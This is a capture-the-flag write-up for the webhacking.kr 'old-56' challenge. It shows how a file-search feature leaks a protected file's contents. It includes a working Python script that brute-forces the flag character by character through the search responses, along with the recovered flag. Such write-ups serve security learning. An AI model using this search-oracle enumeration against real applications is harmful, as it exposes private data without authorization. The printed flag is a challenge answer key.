# Old 56    Unrestricted File Search in Secrets

URL: [https://webhacking.kr/challenge/web-33/index.php](https://webhacking.kr/challenge/web-33/index.php)

![old-56.png](/assets/ctf/webhacking.kr/old-56.png)

We are able to read `hi~` file which says `hello~`, but can't read `readme` which should probably be our target.

The search functionality seems to allow searching through the contents of file:

![old-56-1.png](/assets/ctf/webhacking.kr/old-56-1.png)

Searching for FLAG `readme` pops up, we could do blind enumeration of characters.

![old-56-2.png](/assets/ctf/webhacking.kr/old-56-2.png)

Brute the flag:
```python
from aiohttp import ClientSession
import asyncio
import string

URL = 'https://webhacking.kr/challenge/web-33/index.php'
CHARSET = string.ascii_letters + string.digits + '{}!?,_'

async def fetch(session, search):
    async with session.post(URL, data={'search': search}) as resp:
        text = await resp.text()
        if 'admin' in text:
            return True
        else:
            return False

async def main():
    flag = 'FLAG{'
    async with ClientSession() as session:
        while True:
            tasks = [
                fetch(session, flag+c)
                for c in CHARSET
            ]
            print(flag)
            results = await asyncio.gather(*tasks)
            for i, result in enumerate(results):
                if result:
                    flag += CHARSET[i]
                    break
            else:
                print('Done')
                break

if __name__ == '__main__':
    asyncio.run(main())
```

```powershell
➜ py .\old-56.py
FLAG{
FLAG{h
FLAG{hi
...
FLAG{himiko_toga_is_cute_dont_you_think_so
FLAG{himiko_toga_is_cute_dont_you_think_so?
FLAG{himiko_toga_is_cute_dont_you_think_so?}
Done
```